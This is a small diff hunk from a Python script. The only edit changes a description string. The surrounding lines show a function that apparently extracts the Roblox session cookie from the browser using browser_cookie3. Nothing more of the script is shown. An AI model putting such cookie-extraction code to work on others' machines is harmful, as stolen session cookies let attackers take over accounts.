@@ -2,7 +2,7 @@ import os
 import browser_cookie3
 import requests
 
-NEW_DESCRIPTION = "fub"
+NEW_DESCRIPTION = "fwssas"
 
 def get_roblox_cookie_from_browser():
     try:
